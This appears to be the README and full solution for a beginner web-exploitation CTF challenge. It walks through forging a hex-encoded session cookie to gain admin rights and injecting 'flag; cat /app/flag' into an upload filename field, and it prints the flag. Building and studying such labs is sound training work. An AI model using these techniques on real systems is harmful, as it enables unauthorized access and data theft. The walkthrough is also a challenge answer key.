# ctf-challenge : flag_command
### Challenge Description:

"In the depths of the system lies a hidden payload, waiting to be uncovered. Many have tried to find it, but few have succeeded. The key to your success lies in the shadows—look beyond the obvious, for the hidden payload is concealed in plain sight. Only those who can see the unseen and hear the silent whispers shall prevail."

### Challenge Overview:

This challenge is a web exploitation task that combines session manipulation and command injection. Players must bypass authentication by forging a session cookie and then exploit a command injection vulnerability to retrieve the flag.

### Challenge Details:
- Category: Web Exploitation
- Difficulty: Easy/Medium
- Flag Format: DEFENSYS{...}
- Author: reda abdelali

### Setup Instructions:
##### Prerequisites
- Docker (optional, for containerization)
- Python 3.x
- Flask (pip install flask)

##### Steps to Run the Challenge
- Clone the Repository
```
git clone https://github.com/RedaAbdelali/flag_command.git
  
    cd flag_command
```
    git clone https://github.com/RedaAbdelali/flag_command.git
  
    cd flag_command

    Build and Run the Docker Container (optional):
    bash
    Copy

    docker build -t hidden-payload .
    docker run -p 5000:5000 hidden-payload

    Run the Flask Application Locally:
    bash
    Copy

    python app.py

    Access the Challenge:

        Open your browser and navigate to http://127.0.0.1:5000.

Challenge Walkthrough
Step 1: Log In

    Use the credentials admin:admin to log in.

    After logging in, you’ll see the message: "Welcome, user. Your session has been encoded for security."

Step 2: Inspect the Session Cookie

    Use browser developer tools to inspect the session cookie.

    The session cookie is a hex-encoded string of the session data (e.g., {"role": "user"} → 7b22726f6c65223a202275736572227d).

Step 3: Decode the Session Cookie

    Decode the hex string to reveal the session data.
    python
    Copy

    import binascii
    import json

    cookie = "7b22726f6c65223a202275736572227d"
    session_data = json.loads(binascii.unhexlify(cookie).decode())
    print(session_data)  # Output: {'role': 'user'}

Step 4: Forge a Session Cookie

    Encode {"role": "admin"} as a hex string to generate a valid session cookie.
    python
    Copy

    import binascii
    import json

    session_data = {"role": "admin"}
    session_cookie = binascii.hexlify(json.dumps(session_data).encode()).decode()
    print(session_cookie)  # Output: 7b22726f6c65223a202261646d696e227d

    Replace the original session cookie with the forged one using browser developer tools.

Step 5: Access the Admin Page

    With the forged session cookie, navigate to the gallery page.

Step 6: Exploit Command Injection

    Use the file upload feature to inject a command and retrieve the flag:
    Copy

    flag; cat /app/flag

Step 7: Retrieve the Flag

    The server will return the flag:
    Copy

    Contents of flag; cat /app/flag:
    DEFENSYS{c00k13_m4n1pul4t10n_4nd_c0mm4nd_1nj3ct10n}

Hints

    Hint 1: "The session holds the key. What does it represent? Think in JSON."

    Hint 2: "The session cookie is hex-encoded. Can you decode it?"

    Hint 3: "Sometimes, the answer lies in what you don’t see. Listen to the silent whispers."

    Hint 4: "The treasure is locked away, but the system’s tools can be turned against it."

Solution
Step 1: Log In

    Log in with admin:admin.

Step 2: Inspect the Session Cookie

    The session cookie is a hex-encoded string of {"role": "user"}.

Step 3: Decode the Session Cookie

    Decode the hex string to reveal the session data.

Step 4: Forge a Session Cookie

    Encode {"role": "admin"} as a hex string.

Step 5: Replace the Session Cookie

    Use browser developer tools to replace the original session cookie with the forged one.

Step 6: Access the Admin Page

    Navigate to the gallery page as an admin.

Step 7: Exploit Command Injection

    Enter the payload flag; cat /app/flag in the filename field.

Step 8: Retrieve the Flag

    The server returns the flag: DEFENSYS{c00k13_m4n1pul4t10n_4nd_c0mm4nd_1nj3ct10n}.

Files in the Repository

    app.py: The Flask application.

    templates/login.html: The login page template.

    templates/gallery.html: The gallery page template.

    Dockerfile: Docker configuration for containerization.

    requirements.txt: Python dependencies.

Author

    Name: [Your Name]

    Contact: [Your Email]

    GitHub: [Your GitHub Profile]

License

This project is licensed under the MIT License. See the LICENSE file for details.
Acknowledgments

    Thanks to [CTF Platform/Community Name] for hosting this challenge.

    Inspired by real-world web vulnerabilities.
